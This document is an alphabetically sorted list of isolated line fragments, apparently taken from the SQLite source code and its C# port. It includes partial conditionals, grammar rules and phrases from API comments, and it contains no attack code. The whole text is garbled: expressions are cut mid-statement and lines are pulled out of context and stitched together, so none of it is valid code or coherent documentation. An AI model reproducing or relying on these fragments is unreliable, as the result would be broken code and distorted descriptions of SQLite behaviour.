 nNumberOfBytesToLockLow == SHARED_SIZE){
 nNumberOfBytesToUnlockLow == 1){
 nOp > p.nOpAlloc 
 nOrderBy )
 nOrig == PENDING_BYTE_PAGE(pBt))
 nOverflow
 nOvfl > 0)
 nPage 
 nPage )
 nPage ) > pPg.pgno )
 nPage == -1)
 nPage > 0)
 nPage pages. Some operating system implementations can get confused if
 nPage variable is unchanged from its default value of 100 
 nPagePerSector - 1 ) > nPageCount )
 nPagesPerMapPage ) 
 nPathname 
 nPinned >= ( pCache.nMax 
 nQPlan
 nRead > 0 )
 nRefInitMutex 
 nReg )
 nReq is the number of bytes of memory required. Once this much has
 nReserve < 1000 )
 nReserve <= 255)
 nRow 
 nScratch 
 nSector>szPage) ){
 nSrcPagesize 
 nTrans <= 1 )
 nUsable - cellbody)
 nWrite 
 nWrite < JOURNAL_HDR_SZ( pPager ) 
 nZero
 nZero )
 nZero))
 name and number of parameters exists.  If no such function exists
 name in the journal is longer than nMaster bytes (including a
 name is returned.  Here are the names:
 name must be given in UTF-8 even if the original statement
 name of the database is the name assigned to the database by the
 name resolution is performed.
 name resolved.
 name sqlite_value
 name:       Column name
 named keywordhash.h and then included into this source file by
 names are not also used by explicitly declared columns. If
 names.  The context consists of a list of tables (the pSrcList) field and
 natural 
 nearby <= mxPage)
 nearby == iTrunk)
 necessary to undo a write and the checkpoint should not be set.
 need 
 need >= p.nAlloc ){
 need be.
 need be.  A new entry is created in the SrcList even if pTable is NULL.
 need to be translated.
 need to call malloc() to expand the result of a zeroblob()
 need to move another root-page to fill a gap left by the deleted
 need to occur right after the database cursor.  So go ahead and
 needSync
 needSync )
 needToFreeIdxPtr is true.
 needed by FTS3 when FTS3 is included in the amalgamation.
 needed to generate code for a single SELECT statement.
 needed.
 needs to be freed with the WhereClause) and TERM_VIRTUAL (because it
 needs to be revisited.
 needs to know whether or not the structure contains an SQL NULL
 negFlag 
 negative then the behavior is exactly the same as calling
 negative value indicates no limit.
 never do either. {END}
 never has more than 3 or 4 terms.  Use a value of 0 to disable
 never true.
 never uses these routines except inside an assert() and applications
 new Expr to populate pOut.  Set the span of pOut to be the identifier
 new FuncDef structure that is marked as ephemeral using the
 new MediumTrustLockingStrategy() : new LockingStrategy()
 new data replaces the old data and the old data is returned.
 new database files created using this database handle. It is only
 new entry to the hash table and return it.
 new entry.  Otherwise return NULL.
 new function.  But the FuncDefs for built-in functions are read-only.
 new limit for that construct.  The function returns the old limit.
 new limit is negative.
 new location.  The pointer map is used to locate the parent page quickly.
 new one.
 new rowid that is about to be inserted.  If that new rowid is
 new table is in register pParse->regRoot.
 new trigger context is entered for the duration of that one
 newIdx member contains the index of the vdbe cursor that points at the temp
 new_col_mask == 0xffffffff )
 nexprlist 
 nexprlist ::= expr 
 nexprlist ::= nexprlist COMMA expr 
 next <= pc 
 next iteration of the do-loop will balance the child page.
 next iteration of the loop through the contents of the fifo.
 next opcode.
 next time a statement is prepared using said sqlite3
 next.  Applications that override the built-in mutex logic must be
 nextC != zDate[zIndex] ) )
 nextPage != 0
 nice to have this defensive test here anyway.
 nil 
 nm ::= JOIN_KW 
 nm ::= STRING 
 nm ::= id 
 nmnum ::= DEFAULT 
 nmnum ::= DELETE 
 nmnum ::= ON 
 nmnum ::= nm 
 nmnum ::= plus_num 
 nnn are atomic.  The SQLITE_IOCAP_SAFE_APPEND value means
 no INTEGER PRIMARY KEY.
 no VDBE code was generated.
 no entries.
 no fewer collisions than the no-op 
 no gaps.
 no longer available as a temp register.  ticket 
 no longer needs the pClientData pointer.  
 no matching function previously existed.  When createFlag is true
 no modifications are made and SQLITE_CORRUPT is returned.
 no progress.  By returning SQLITE_BUSY and not invoking the busy callback
 no rollbacks are happening.
 no rows.
 no space was left in the page cache.</dd>
 no temp tables are required.
 no way for a TK_REGISTER to exist here.  But it seems prudent to
 no-op
 no-op 
 no-op.  It is retained for historical compatibility.
 no-sync option for the journal.  A power failure could lead to corruption
 noContent != 0 )
 node in the expression tree.  Return 0 to continue the search down
 node taken from the head of 
 node to replace the deleted cell.  
 node. The cell from the leaf node needs to be moved to the internal
 non-negative.  For non-negative values of P4 only the lower 4
 non-operational:
 non-zero [error code] if a discontinued or unsupported configuration option
 non-zero value is passed as the noContent parameter and the
 noop macros.
 normally a worry.
 not NULL before calling it.
 not a permanent error and does not affect the return value of
 not be a problem.
 not be counted as untested code.
 not be covered by coverage testing on any single host. But coverage
 not be in the pager cache. Later: if a malloc() or IO error occurs
 not been destroyed.
 not constant.
 not contain an integer.  An Debug.Assertion fault will result if you try.
 not contained in both tables to be joined.
 not create a new trigger context.
 not define OMIT_DECLTYPE.
 not doing a threadsafe build.  Ticket 
 not downgrade the database and thus invalidate any descending
 not effected by the sqlite3_interrupt().
 not exceeded even for corrupt database files.
 not guaranteed.  The location of the column value is returned.
 not happened yet) so we substitute a rowid of -1
 not have more than a dozen or so columns in any table.  And if
 not just the specific connection that was passed to sqlite3_backup_init().
 not need to be synced following this operation.
 not need to contain a lot of randomness since we are not
 not possible to increase the size of a BLOB using this API.
 not reload the schema from the database file.
 not set the value of its left-hand side nonterminal.  Leaving the
 not specified in the header.
 not support Writable Static Data (WSD) such as global and static variables.
 not the database file. The page is left marked dirty in this case.
 not the internal Mem type.
 not to clear the cursor here.
 not used as the right operand of an outer join.  Examples of why this
 not want the user to be able to make arbitrary changes to the
 not want to write into deallocated memory.
 not want to.  But SQLite will only request a recursive mutex in
 not want to.  {H17016} But SQLite will only request a recursive mutex in
 not yet been opened.
 not yet been opened. In this case there have been no changes to
 not yet been released.
 notReady ) != 0 ) continue
 notReady ) == 0
 notReady ) == 0 )
 notReady)==null 
 nothing is written into 
 notnull:    True if 'NOT NULL' is part of column declaration
 now a fatal error.  Calling [sqlite3_prepare_v2()] again will not make the
 now generate the new WHERE rowid IN clause for the DELETE/UDPATE 
 now stored either on real database pages or within the
 now without breaking compatibility.
 now.
 ntuPerHalfDay
 nul-terminator byte (0x00). i.e. the entire contents of a master journal
 nul-terminator byte is appended to the buffer following the master
 nul-terminator.
 null : Encoding.UTF8.GetBytes( sqlite3_value_text( pVal ) )
 null : cf.pAggInfo.Copy()
 null : cf.pColl.Copy()
 null : cf.pLeft.Copy()
 null : cf.pRight.Copy()
 null : cf.pTab.Copy()
 null : cf.x.pList.Copy()
 null : cf.x.pSelect.Copy()
 null : pPager.aSavepoint[nNew - 1]
 null : pProbe.pNext ) )
 null == p.pDest )
 null == p.pOffset ) )
 null == pBt.pCursor)
 null == pCache.pDirty ) 
 null == pColl )
 null == pCur.pKey)
 null == pExpr.x.pList
 null == pIndexedBy.z )
 null == pParse.trigStack )
 null == pTab.pSelect 
 null == pTrigger 
 null == zName 
 number ::= INTEGER
 number P2. The key is stored in register P3. The key must
 number R. Register P4 is the first in a set of N contiguous registers
 number for that variable.
 number for the next page in the overflow chain. The page
 number for the pointer-map page that contains the entry for the
 number for the root page of the new table.
 number for the token at this stack level 
 number generator) not as an encryption device.
 number in the database. So move the page that does into the
 number of arguments may be returned even if the eTextRep flag does not
 number of binary searched
 number of bits specified by the integer in register P1.
 number of bytes in the parameter.  To be clear: the value is the
 number of columns in the result set of the SELECT) then the expression
 number of columns of data returned by the statement.
 number of entries in the b-tree and write the result to pnEntry.
 number of fields in the record 
 number of levels of indirection are allowed.
 number of pages the database file will contain after this
 number of parameters and preferred encoding.
 number of rows in the table that match any particular value of the
 number of unicode characters in the first nByte of pZ (or up to
 number of unique parameters.  If parameters of the 
 number of you get the same value back again.  To do this
 number ovfl to determine the next page number.
 number pTabList.a[0].iCursor.  t2 uses the cursor pTabList.a[1].iCursor.
 number so that sqlite3ResolveOrderGroupBy() will convert the
 numbers all get mapped into bit numbers that begin with 0 and contain
 numbers are obtained separately.  Let N be the number of rows
 numeric affinity to the value.  This means that an attempt is
 nxDiv - pParent.nOverflow)
 nxDiv - pParent.nOverflow) == pParent.nCell)
 nxDiv == pParent.aOvfl[0].idx 
 object and uses it for page cache memory allocations.</dd>
 object on the end of the array.
 object once the object has been registered.
 object results in undefined behavior.
 object returns an integer which is a vector of the these
 object should be passed to sqlite3_backup_finish(). This releases all
 object that is attached to the original OR clause term.
 object to be interrogated.  The second argument
 object when the iVersion value is increased.  Note that the structure
 object with no outstanding references.
 objects and uses the result to populate a new ExprSpan object.
 objects in the same database connection since doing so will lead
 objects.
 obtain a read-lock using this function. The only read-lock obtained
 obtain space from malloc().
 obtain the lock succeeds.
 obtain the mutexes on all attached databases before checking if
 obtain the required table-locks. This is a no-op unless the
 obtained from [sqlite3_malloc()].  If you run a memory leak checker
 obtained from malloc().
 obtained from sqlite3DbMalloc().  The calling function
 obtained on the database file when a write-transaction is started.  No
 obtained on the destination file. It is not released until either 
 obviously.  The INSERT primitive adds a new element to the RowSet.
 oc == OP_SeekGe )
 oc == OP_SeekGt )
 oc == OP_SeekGt ) )
 oc == OP_SeekLe )
 oc == OP_SeekLt ) )
 occur.
 occurred.
 occurrences have the same index as the first occurrence.
 occurs after nRec is updated but before this connection writes
 occurs anyway. The integrity of the database is maintained by a
 occurs.
 occurs.  IGNORE means that the particular row that caused the constraint
 of 1 to pParse.nAlias inclusive.
 of 8.  Some allocators round up to a larger multiple or to a power of 2.
 of A's read lock.  A tries to promote to reserved but is blocked by B.
 of NULL.
 of Pager.sectorSize is restored at the end of that routine.
 of SQLite will not understand those serial types.
 of SQLite.
 of UTF-16 in the native byte order.
 of VDBE ops have been executed (either since this invocation of
 of a 1048569-byte BLOB or string.
 of a 3-way or more compound 
 of a 32-bit checksum on each page of data.  The checksum covers both
 of a SELECT statement.
 of a SELECT.
 of a VdbeOp structure into a negative number so that
 of a master journal file that should be written into the individual
 of a record generated by OP_MakeRecord where the last field is the
 of a trigger. 
 of a valid mutex handle. The implementations of the methods defined
 of action to take.
 of all columns in TABLE.  The parser inserted a special expression
 of all of BtShared structures accessible via the database handle
 of an [sqlite3_io_methods] object.
 of an argument to the module name in a CREATE VIRTUAL TABLE statement.
 of an internal error resulting in an automatic call to
 of another. It is useful either for creating backups of databases or
 of any expression tree referenced by the structure passed as the
 of any open savepoints as appropriate.
 of any resources used by the v-table implementation (including other
 of at least N bytes in size or NULL if sufficient memory is unavailable.
 of at least sz
 of both right and left sides must be such that no type
 of bytes in the zero-filled tail is included in the return value only
 of bytes of memory released.
 of bytes written is returned.
 of code will give us the ability to simulate a disk I/O error.  This
 of columns to be inserted into the table.
 of data are copied from the buffer pBuf to pPayload.
 of data. Compute and return a checksum based ont the contents of the
 of date set pParse->rc to SQLITE_SCHEMA.  If all schema cookies
 of deep recursion and N
 of dupedExprStructSize() contain multiple assert() statements that attempt
 of each BtShared structure and so this locking is not necessary.
 of each of the virtual tables in the sqlite3.aVTrans array. The method
 of errors.  If an error is seen leave an error message in pParse.zErrMsg.
 of existing SQL functions or aggregates.  The only difference between the
 of flattening - a flattening other than a compound-subquery flattening -
 of good-quality randomness into zOut.  The return value is
 of handle p (type Btree
 of heap memory by deallocating non-essential memory allocations
 of how long that statement took to run.
 of integers in P4.
 of memory returned.
 of op.
 of output.
 of pCost. 
 of pToRelease.  Make sure pToRelease is still writeable. 
 of page when parsing a cell.
 of parameters that follow the module name are still pending.
 of passing a NULL pointer instead of a valid mutex handle are undefined
 of records (see syncJournal()).
 of rows that match any particular combiniation of the first 2 columns
 of sqlite3_initialize() does any initialization.  All other calls
 of strings is ignored.  This implements the RTRIM collation.
 of that subquery.
 of that table into the internal index hash table.  This will cause
 of that table.
 of the APIs above provided that the pointer is not NULL.  But
 of the Expr structure and a copy of the Expr.u.zToken string (if that
 of the PAGER_OMIT_JOURNAL and PAGER_NO_READLOCK flags.
 of the PRAGMA command. In this case the journal-mode must be
 of the PRAGMA command. In this case the locking-mode must be
 of the SELECT statement. Return the declaration type and origin
 of the SQLITE_CONFIG_PAGECACHE and sqlite3_release_memory() features.
 of the SQLite library that is running.
 of the UPDATE statement.  Also find the column index
 of the [SQLITE_THREADSAFE] flag.  If SQLite is compiled with
 of the [sqlite3_create_function()]
 of the [sqlite3_io_methods] object and for the [sqlite3_file_control()]
 of the [virtual table].  Each subclass will
 of the aBalanceQuickSpace[] might sneak in.
 of the application-defined function to be NULL.
 of the application-defined function to be the 32-bit signed integer
 of the application-defined function to be the 64-bit signed integer
 of the backup operation.  Any attempt to use the destination
 of the cell-content area plus the number of free bytes within
 of the conditions above fail so that the optimization should not
 of the default name is recommended.
 of the destination page.
 of the expression. affinityStr stores a static string suitable for
 of the file is found.
 of the file.
 of the first SMALLEST is O(NlogN).  Second and subsequent SMALLEST
 of the first byte of allocated space. Return either SQLITE_OK or
 of the first page of the sector pPg is located on.
 of the following flags:
 of the following structure to describe a particular instance
 of the following structure.
 of the following structure.  There are normally two of these structures
 of the following:
 of the function.  This is used to implement the sqlite3_get_auxdata()
 of the global cache.
 of the header will therefore be the serial type of the rowid:
 of the index is also allowed to match against the ORDER BY
 of the index.  And so forth.  It must always be the case that
 of the integrity check.
 of the join.  Disabling is an optimization.  When terms are satisfied
 of the join.  Subtracting one from the right table bitmask gives a
 of the journal file is deferred until there is an actual need to
 of the library by 738 bytes on ix86.
 of the main journal file.  Continue to skip out-of-range pages and
 of the module.  Each module implementation will define
 of the more general WHERE clause.  These terms are moved over to the
 of the new function always causes an exception to be thrown.  So
 of the node stored on pRoot into the new child page.
 of the open database file. The sector size will be used used
 of the page 'extra' space to invalidate the Btree layers
 of the page that participate in the balancing operation.  NB is the
 of the page. This occurs in two seperate scenarios:
 of the parent page are still manipulated by thh code below.
 of the parsing error that results in an [SQLITE_SCHEMA] return.
 of the prior allocation are copied into the beginning of buffer returned
 of the program.  It is only here for testing and debugging.
 of the range.
 of the record to data0.
 of the record to the start of the data for the i-th column
 of the result set of SQL statement pStmt.
 of the scan loop.
 of the schema hash tables).
 of the schema used when compiling the SQL query matches the schema of
 of the schema was loaded before the error occurred. The primary
 of the second argument to sqlite3_collation_needed() or
 of the sqlite3BtreeEnterAll() in sqlite3LockAndPrepare()) so it
 of the sqlite3_create_collation_v2().
 of the sqlite3_file object.  This is mostly just syntactic sugar. All
 of the sqlite3_initialize and sqlite3_shutdown()
 of the sqlite3_vfs object changes in the transaction between
 of the sqlite3_vfs.xRead method.
 of the string.  For clarity: the value returned is the number of
 of the subquery rather the result set of the subquery.
 of the subquery.
 of the suggested cache-sizes.
 of the table column that the inequality contrains is not NULL.
 of the table containing column.
 of the table currently under construction.
 of the table is a linear scan through the file.  That
 of the tables being read by the SELECT statement.  Also use a
 of the transaction. Return an error code if anything goes wrong.
 of the virtual table named zTab in database iDb. 
 of the virtual table named zTab in database iDb. This occurs
 of the xOpen() method of the supplied VFS when opening files.
 of these instead if they exist. Avoid a UTF-8 <. UTF-16 conversion if
 of these mutex routines.  An appropriate implementation
 of this collation function (for other text encodings) available. Use one
 of this function and be careful not to change any page data unless
 of this interface is recursive.
 of this routine with 0xfff.  The flags can be found by masking the
 of this routine.
 of this structure must not change while it is registered with
 of this structure.
 of this would be completely automatic if SQLite were coded using
 of times it has performed specific operations.  These counters can
 of triggers.
 of type eDest with parameter iParm.
 of user defined functions and collation sequences.
 of values is identified by a unique P4 value. The first set
 of what each interface routine does.
 of writing code to use the b-tree layer directly is that the
 off all other flags.
 off if the expression is reduced.  Note also that it does not work to
 off the Internet.  The internal databases can be given the
 offset > ovflSize)
 offset > pCur.info.nLocal)
 offset)
 offset64 != (u64)payloadSize ) )
 offset64 > payloadSize
 offsetLeft] != 0 
 offsetLeft]] - UpperToLower[zRight[b]]
 offsetLeft]] == UpperToLower[zRight[b]] ) { a
 offset]
 offset] )
 offset] << 16 ) 
 offset] << 24 ) 
 offset] << 8 ) 
 offset] = (byte)( v 
 offset] = (byte)( v >> 16 
 offset] = (byte)( v >> 24 
 offset] = (byte)( v >> 8 
 offset])
 offsets from the beginning of the page to the cell content in the cell
 often.  
 okToChngToIN != 0 
 oldIdx != -1 )
 omits the rowid at the end.  The rowid at the end of the index entry
 omitted if that module is not used.
 omitted.
 on Ptr(N) and its subpages have values greater than Key(N-1).  And
 on SQLITE_MISUSE returns.  SQLITE_MISUSE is intended to indicate a
 on SQLite. It is fine to have an implementation that never
 on a connection by connection basis.  The first parameter is the
 on a per database connection basis using the
 on a recent machine (ex: RedHat 7.2) but you want your code to work
 on a table.
 on a win32 system.
 on an older machine (ex: RedHat 6.0).  If you compile on RedHat 7.2
 on both a Bitvec object and on a linear array of bits obtained from malloc.
 on disk is not created or populated until either:
 on disk.
 on each used database.
 on how SQLite interfaces are suppose to operate.
 on i486 hardware.
 on jump instructions.  Each such value is a label.  Resolve the
 on left table of a LEFT JOIN.  Ticket 
 on one page.  Thus the default max embedded payload fraction is 64.
 on platforms with limited memory.
 on ppPage to free the reference. In no reference was obtained (because
 on register iReg. This is used when an equivalent integer value is
 on success and 1 if the input string is not a well-formed
 on success and 1 if there are any errors.
 on success or an error code is something goes wrong.
 on success.  Set pRes to 0 if the cursor actually points to something
 on tables and/or indices that are the process of being deleted.
 on the [database connection] specified by the first parameter.
 on the amount of heap memory that may be allocated by SQLite.
 on the cache using a hash function.  This is used for testing
 on the command-line
 on the compiler command line.  This is necessary if you are compiling
 on the current table.  That way we only have to compute it once
 on the database file.
 on the expression list.
 on the file.
 on the given page is unused. The pager marks the page as clean so
 on the leaf node first. If the balance proceeds far enough up the
 on the local page.  No overflow is required.
 on the most recently created savepoint. If iSavepoint is greater than
 on the same disk sector. Syncing the journal is not allowed while
 on the second iteration 
 on the shared btree structure pBt.
 on the source database. Close the read transaction here. There is
 on this function.
 on this shared-btree structure and a second write transaction is
 on top of the stack.)
 on when SQLite is already shut down.  If SQLite is already shut down
 on which the lock is acquired.  A readlock is obtained if P3==0 or
 on-disk database will be created.  This private database will be
 onError != OE_Rollback )
 onError == OE_Abort 
 onError == OE_Fail
 onError == OE_Ignore 
 onError == OE_Replace )
 on_opt 
 on_opt ::= 
 on_opt ::= ON expr 
 once straight down through.  Pseudo-code follows (we call this
 onconf ::= 
 onconf ::= ON CONFLICT resolvetype 
 one additional column containing the rowid.  The rowid column
 one column. Execute this as SQL on the same database.
 one entry for each overflow page in the overflow chain. The
 one is defined. The xRename() callback will modify the names
 one of the following opcodes:
 one of the index names collides with the name of a temporary table or
 one opcode now works for both table types.
 one or more savepoint bitvecs. This is the reason this function
 one or more statically linked extensions that will be available
 one or two in an effort to keep pages nearly full but not over full.
 one or two registers for holding the rowid.  One rowid register
 one release of SQLite to the next.
 one row of the input to the aggregator has been
 one trigger that must be fired when an operation of type 'op' is
 ones-complement of the P1 value into register P2.  If P1 holds
 oneselect 
 oneselect ::= SELECT distinct selcollist from where_opt groupby_opt having_opt orderby_opt limit_opt 
 online backup operation.  The sqlite3_backup object is created by
 only a single column may be output.
 only be a single writer).
 only if the file is write protected by the operating system.  In either
 only keys and no data.  The intkey flag means that the key is a integer
 only looks at whether subterms appropriate for indexing exist.
 only that database connection may use the Schema to prepare
 only those incrblob cursors open on this specific row.
 only valid if all tables referenced in expr occur to the left
 only way to prevent a call to xClose following a failed xOpen
 only within the VDBE.  Interface routines refer to a Mem using the
 only.
 only.  The KeyInfo elements are used sequentially.
 op != TK_UPLUS )
 op ) != 0
 op < 0xff )
 op < ArraySize( wsdStat.nowValue ) )
 op <= TK_GE ) 
 op == OP_Eq )
 op == OP_Ge )
 op == OP_Gt )
 op == OP_IsNull )
 op == OP_Le )
 op == OP_Lt )
 op == OP_Ne )
 op == OP_NotNull )
 op == SAVEPOINT_RELEASE 
 op == SAVEPOINT_ROLLBACK )
 op == SAVEPOINT_ROLLBACK)
 op == SAVEPOINT_ROLLBACK))
 op == TK_ALL )
 op == TK_COLUMN 
 op == TK_DELETE )
 op == TK_FLOAT 
 op == TK_FLOAT ) 
 op == TK_INSERT 
 op == TK_INTEGER )
 op == TK_INTERSECT )
 op == TK_ISNULL
 op == TK_REGISTER )
 op == TK_REGISTER ) 
 op == TK_UNION )
 op == TK_UPDATE 
 op >= ArraySize( wsdStat.nowValue ) )
 op==TK_REGISTER 
 opaque sqlite3_pcache
 opcode < opcodeProperty.Length )
 opcode == OP_AggStep )
 opcode == OP_OpenRead )
 opcode allows the call to continue functioning after a OOM fault without
 opcode and the opcodes.c file is filled with an array of strings where
 opcode causes the xFileControl method to write the current state of
 opcode follows immediately after the last operand.
 opcode into an OP_Noop.  This avoid a call to sqlite3OsOpenExclusive()
 opcode==OP_VRename ){
 open and is not being used by another thread.  By changing the value
 open cursor.  If the database was unlocked prior to this instruction
 open properly and is not fit for general use but which can be
 open savepoints. If the second parameter is greater than 0 and
 open so it is safe to access without the BtShared mutex.
 opened by cursor P1 in register P2
 opened by this VM before returning control to the user. This is to
 opened savepoint. Savepoints are added to the list by the vdbe
 opened to write a rollback log for a transaction. It is not used
 opened.
 opening the file until the first call to OsWrite().
 opens a statement transaction may invoke this opcode.
 opens in the multi-thread [threading mode] as long as the single-thread
 opens the cursor.
 operand.
 operate asynchronously - it will not stop to do fsync()s
 operate consistently from one release to the next.
 operates.
 operating system wants filenames in.  Space to hold the result
 operation assumes the key is an integer and that P1 is a table whereas
 operation is allowed to continue normally.  If the commit hook
 operation of the pager. It should be passed some bitwise combination
 operation to continue but invalidate all precompiled statements.
 operation.
 operation.  Special comments in vdbe.c and the mkopcodeh.awk script in
 operation. Store this value in nNew. Then free resources associated
 operator or subquery.
 operator specified in the op parameter.  The WhereClause structure
 operator with A.  This routine shifts that operator over to B.
 operator.
 operators that need to be expanded.  Loop through each expression
 opportunity to do this here since we have just deleted all of the
 optimization 2 above is ommitted if the corresponding bit is already
 optimized.
 option is enabled at compile-time 
 option is set.  Thus NDEBUG becomes an opt-in rather than an opt-out
 option) the application must supply a suitable implementation for
 options that are useful for constructing SQL statements.
 or 0 (an integer value). If the data structure contains one
 or 9223372036854775808 if negative.  Note that 9223372036854665808
 or Ctrl-C where the user wants a long query operation to halt
 or DEFAULT_TEMP_STORE pragmas.
 or MEM_Str that has been used by a VDBE opcode.  The test procedures
 or Rollback() will finish the transaction and unlock the database.  
 or SAVEPOINT_RELEASE. This function either releases or rolls back the
 or SQLITE_MUTEX_RECURSIVE) is used then sqlite3_mutex_alloc()
 or SQLITE_NOMEM if a malloc failure occurs.
 or UNIQUE constraint of a CREATE TABLE statement.  Since the table
 or USING clause of that join.
 or VDBE.  The VDBE implements an abstract machine that runs a
 or WinNT.
 or [DELETE] statement are counted.  Auxiliary changes caused by
 or [SQLITE_CONFIG_MUTEX].  The return value of this function shows
 or [SQLITE_IOERR_BLOCKED] instead of invoking the busy handler.
 or [prepared statement] that invoked the busy handler.
 or [sqlite3_errmsg()]. {A11308} The underlying xFileControl method might
 or [sqlite3_value_text16()].
 or a NULL pointer. {H11304} The third and fourth parameters to this routine
 or a function call with constant arguments.  Return and 0 if there
 or an IO error code if an IO error occurs while rolling back a
 or an error code.
 or any other database connection. Exactly how a journal is finalized
 or be scattered out on multiple overflow pages.
 or both.
 or by other independent statements.
 or changes one of the flags in db.flags.  Return 1 if so and 0 if not.
 or else it must be a TEMP trigger. 
 or else the use of the [temp_store_directory pragma] should be avoided.
 or ephermal table) is stored in pX->iTable before this function returns.
 or equal to the product of the second and third arguments.</dd>
 or executed.  All the parser does is build the internal data
 or failure of the xOpen call.
 or follwed by an inverted copy (t2.b==t1.a).  Skip this term
 or for the first call after a call to sqlite3_shutdown.
 or greater lock on the database file. Now check that there is
 or greater than pUnpacked.  Return SQLITE_OK on success.
 or greater than parameter iLimit. Any pinned pages with a page number
 or if SQLite is run in one of reduced mutex modes 
 or if the end of the last field appears to be past the end of the
 or if the pager is in an error state other than SQLITE_FULL.
 or if the parser is being invoked from within sqlite3_declare_vtab.
 or in an ORDER BY or GROUP BY clause.</dd>
 or inserted or deleted by the most recently completed SQL statement
 or it can stay at PAGER_EXCLUSIVE if we are in exclusive access mode.
 or journal files.
 or may not be initialised.
 or may not be the same as R.
 or modify this field while holding a particular static mutex.
 or month or year.
 or more database connections.  When two or more connections are
 or more open savepoints for which:
 or negative rowids are very uncommon so this should not be a problem.
 or not a given identifier is really an SQL keyword.  The same thing
 or old.
 or pages with the Pager.noSync flag set.
 or power failures by changing the number of syncs()s when writing
 or process has locked.
 or reset.
 or rollback hook in the first place.
 or rolling back a transaction (including rolling back a hot-journal).
 or set pRes to 1 if the table is empty.
 or since the most recent reset.
 or some other connection that has the read-uncommitted flag set.
 or some other error code if we fail. The OS will automatically
 or some other error code on failure.
 or sqlite3MemRealloc().
 or sqlite3_os_end() directly.  The application should only invoke
 or sqlite3_result_blob is the special constant SQLITE_TRANSIENT
 or sqlite3_result_error16() is negative then SQLite takes as the error
 or sqlite3_result_error16() resets the error code to SQLITE_ERROR.
 or substituting a collation sequence of a different encoding when the
 or table2.column as the LHS if either is common to every term of
 or tables and not the table/index that is actually being moved.
 or using a temporary file otherwise.
 or when trying to upgrade from a RESERVED lock to an EXCLUSIVE
 or with NULL if no database is specified.
 or xRealloc().
 or xStep is non-zero.
 orconf    -> stores the ON CONFLICT algorithm
 orconf ::= 
 orconf ::= OR resolvetype 
 order and set up its I/O subsystem accordingly.
 order for sqlite3_open16(). A [database connection] handle is usually
 order of the parameters is reversed.
 order to signal the caller to abort.
 order to verify that SQLite recovers gracefully from such
 order-by term to a copy of the result-set expression 
 order.
 orderby_opt 
 orderby_opt ::= 
 orderby_opt ::= ORDER BY sortlist 
 orders for the comparison.  The permutation applies to registers
 origin info for the single column in the result set of the SELECT
 original CREATE TABLE statement if the expression is a column. The
 original SQL text. This causes the [sqlite3_step()] interface to
 original Select structure that describes the SELECT statement.  These
 original and hence if the original changes so will the copy.
 originally opened for writing and the cursor has not be disabled
 originally specified as UTF-16 in [sqlite3_prepare16()] or
 originated in the ON or USING clause.
 other bits of code that are needed to support the arguments
 other bytes change randomly with each file change when
 other bytes in the file.  The xDeviceCharacteristics()
 other connection managed to get in and roll it back before
 other expressions in the SELECT statement. This is so that
 other files are for internal use by SQLite and should not be
 other of the == operator in every subterm.  That table and column
 other place where expressions can be converted into TK_REGISTER is
 other process attempting to access the database file will get to
 other process can start another write transaction while this transaction is
 other statements.
 other than page 1 with a page number greater than pgno.
 other than the one the BLOB handle is open on.
 other thread accesses the destination handle for the duration
 other variables in this block are described in the comment directly
 otherwise (if the message was truncated).
 otherwise.
 ourselves.
 out code that would never execute.
 out how much space is required for the new record.
 out of the way 
 out so that the functionality is now the same as standard printf().
 out-of-date data that follows it. Database corruption.
 out2-prerelease 
 out2-prerelease: 
 out3:  P3 is an output 
 outer   
 outer queries
 outer query (the middle slot) is used by the subquery.  The next
 outer query is distinct.
 outer query.
 outer sqlite3_step() wrapper procedure.
 outermost parser.
 output buffer undefined.
 output buffer xFullPathname.  The exact size of the output buffer
 output mask is set to the special value 0xffffffff.
 output value.  A comparison is made against this value and the output
 output variable when querying the system for the current mutex
 output variables to zero.
 output which is specified by the P2 parameter.  The P2 register
 over the new database connection.  The flags parameter can take one of
 over the top of the loop into the body of it. In this case the
 over time.  Software that uses extended result codes should expect
 over to iTo..iTo
 over to the temporary database.  None of these objects has any
 overflow list for the current row. This is used by cursors opened
 overflow occurred.
 overflow page. Therefore if ovflPgno<2 or past the end of the
 overflow pages.  The strategy is to minimize the amount of unused
 overfull (has one or more overflow pages).
 overload Z as MD5 context 
 overload Z as MEM space 
 overload Z as STR context 
 overload Z as Sum context 
 override this setting
 overrideError : OE_Abort
 overwrites the previous.  This information is used for testing and
 overwritten or altered.
 overwritten with zeros.
 ovflPageSize - 1) / ovflPageSize)
 ovflPgno > pagerPagecount(pBt))
 own equivalent internal routines.  The atoi() and atof() names are
 own name.
 p != null
 p != null 
 p != pS.pTrigger 
 p < db.lookaside.pEnd
 p < pEnd 
 p < pcache1.pEnd )
 p = (CHAR
 p = p.next )//( p = sqliteHashFirst( db.aCollSeq ) 
 p = p.pDirtyNext )
 p = p.pHash )
 p = p.pLruNext )
 p = p.pNext )
 p = p.pNext ) n
 p = p.pNext)
 p = pHash )
 p = pNext )
 p = sqliteHashNext( p ) )
 p == null 
 p >= db.lookaside.pStart 
 p!=db
 p!=null
 p!=pCache.pSynced
 p->cnt==0
 p->cnt>0
 p->db==p->pBt->db )
 p->id==SQLITE_MUTEX_RECURSIVE )
 p->locked boolean to true.
 p->locked)
 p->locked==0 
 p->nByte : 0
 p->pBlockingConnection )
 p->pBlockingConnection!=db )
 p->pBt->db==p->db )
 p->pNext->db==p->db )
 p->pNext->pBt>p->pBt )
 p->pNext==0 )
 p->pPrev->db==p->db )
 p->pPrev->pBt<p->pBt )
 p->pPrev==0) )
 p->pTab!=0 happens when pExpr was originally
 p->pUnlockConnection!=db )
 p->pUnlockConnection==0 ){
 p->pVTable list to the sqlite3.pDisconnect lists of their associated
 p->sharable 
 p->sharable ){
 p->sharable) 
 p->wantToLock==0 )
 p->wantToLock>0 )
 p.Context != null )
 p.a != null )
 p.aConstraintUsage[i].argvIndex>0 ){
 p.aOp == null )
 p.aOp[i].cycles/p.aOp[i].cnt : 0
 p.aOp[i].opcode != OP_Explain )
 p.aOp[p.nOp - 1].zComment == null /
 p.bDestLocked == 0
 p.cnt > 0 )
 p.db.errMask ) == rc )
 p.db.mallocFailed != 0 
 p.errorAction == OE_Fail )
 p.expired )
 p.expired ) 
 p.explain == 2 
 p.iColumn == -1
 p.iColumn == iCol )
 p.iColumn == iColumn
 p.iDivisor != 0 )
 p.iLevel > pParse.iCacheLevel )
 p.iNext <= (Pgno)nSrcPage 
 p.iOffset 
 p.iPrefEnc == SQLITE_UTF16BE ) 
 p.iPrefEnc == SQLITE_UTF16LE ) )
 p.iPrefEnc == enc 
 p.iStatement!=0 )
 p.iTab == iTab )
 p.iTable == _base 
 p.iTable == iTab 
 p.iTable == iTable 
